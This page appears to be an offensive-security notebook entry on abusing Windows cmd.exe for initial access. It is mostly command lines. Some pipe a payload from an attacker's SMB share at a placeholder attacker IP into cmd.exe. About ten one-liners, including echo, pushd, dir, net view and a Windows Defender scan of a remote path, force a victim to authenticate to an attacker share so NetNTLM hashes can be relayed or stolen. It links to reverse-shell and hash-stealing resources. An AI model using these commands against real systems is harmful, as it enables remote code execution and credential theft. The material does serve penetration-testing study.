---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - living-off-the-land
  - windows
---
# Command Prompt

## 01 - Common Files

```
C:\Windows\System32\cmd.exe
C:\Windows\SysWOW64\cmd.exe
```

## 02 - Execute Payloads

> [!INFO] [Character Maximum Limit](https://learn.microsoft.com/en-us/troubleshoot/windows-client/shell-experience/command-line-string-limitation)
> The maximum length of characters is a total of 8192 when executing through a command prompt.

Execute commands.

```
C:\> cmd.exe /c <commands>
```

```
C:\> cmd.exe - < [<drive_letter>:\]path\to\payload.txt

C:\> cmd.exe /c - \\<attacker_IP>\path\to\payload.txt

C:\> cmd.exe /c < \\<attacker_IP>\path\to\payload.txt
```

Execute command to perform SMB authentication relay.

```
C:\> echo 1 > //<attacker_IP>/<share_name>

C:\> pushd \\<attacker_IP>\<share_name>

C:\> cmd.exe /k \\<attacker_IP>\<share_name>

C:\> cmd.exe /c \\<attacker_IP>\<share_name>

C:\> start \\<attacker_IP>\<share_name>

C:\> mkdir \\<attacker_IP>\<share_name>

C:\> type \\<attacker_IP>\<share_name>

C:\> dir \\<attacker_IP>\<share_name>

C:\> net.exe view \\<attacker_IP>

C:\> "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File \\<attacker_IP>\<share_name>\file.txt
```

TODO: Check the rest

```
find.exe, findstr.exe, [x]copy, move, replace.exe, del, rename and many more!
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/Malware Development/Bypass Defenses/Obfuscation/Techniques/String Manipulation/Windows/Batch|Malware Development: Batch Obfuscation Techniques]]

### LOLBAS

- [LOLBAS: Cmd](https://lolbas-project.github.io/lolbas/Binaries/Cmd/)

### Source Repositories

- [r00t-3xp10it: CmdLine Scripts for Reverse TCP Shell Addicts](https://github.com/r00t-3xp10it/venom/wiki/CmdLine-%26-Scripts-for-reverse-TCP-shell-addicts)

### Osanda

- [Osanda: Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)